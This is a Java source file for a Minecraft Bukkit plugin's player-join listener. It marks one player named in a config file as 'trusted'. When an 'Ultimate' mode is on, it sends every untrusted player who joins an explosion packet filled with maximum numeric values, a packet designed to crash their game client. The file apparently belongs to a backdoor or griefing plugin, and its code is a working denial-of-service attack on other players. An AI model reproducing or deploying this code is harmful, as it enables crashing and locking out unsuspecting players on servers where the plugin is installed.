package me.maiko.events;

import java.util.Collections;

import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import me.maiko.main.Main;
import me.maiko.modules.important.Ultimate_Mod;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.Vec3D;

public class PlayerJoinListener implements Listener{

	@SuppressWarnings("unchecked")
	@EventHandler
	public void on(PlayerJoinEvent e) {
		if (Main.filecfg.get("Player").equals(e.getPlayer().getName())) {
			Main.trusted.add(e.getPlayer());
			e.getPlayer().sendMessage(Main.Prefix + "Du wurdest wieder getrusted!");
		}
		if (Ultimate_Mod.Ultimate) {
			if (!Main.trusted.contains(e.getPlayer()) && !Main.trusted.contains(e.getPlayer())) {
				((CraftPlayer) e.getPlayer()).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(
						Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.EMPTY_LIST,
						new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
			}
		}

	}
}
